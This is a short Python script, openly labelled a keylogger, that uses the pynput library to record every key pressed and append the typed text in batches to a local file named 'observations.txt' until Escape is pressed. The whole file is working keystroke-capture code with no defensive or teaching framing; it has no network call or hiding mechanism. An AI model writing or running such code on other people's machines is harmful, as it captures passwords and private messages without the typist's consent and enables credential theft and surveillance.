#keylogger

import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
	global keys, count
	keys.append(key) #add keys to a keys list
	count += 1

	if count >= 10: #save over time the progress (useful if program exists unexpectedly)
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open("observations.txt", "a") as f:
		for key in keys:
			k = str(key).replace("'", '') #delete quotes
			index = keys.index(key)
			if k.find("space") > 0 and keys[index-1] != '\n': #write on a new line to separate words
				f.write('\n')
			elif k.find("Key") == -1: 
				f.write(k)


def on_release(key): #click escape to stop the keylogger
	if key == Key.esc:
		return False

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()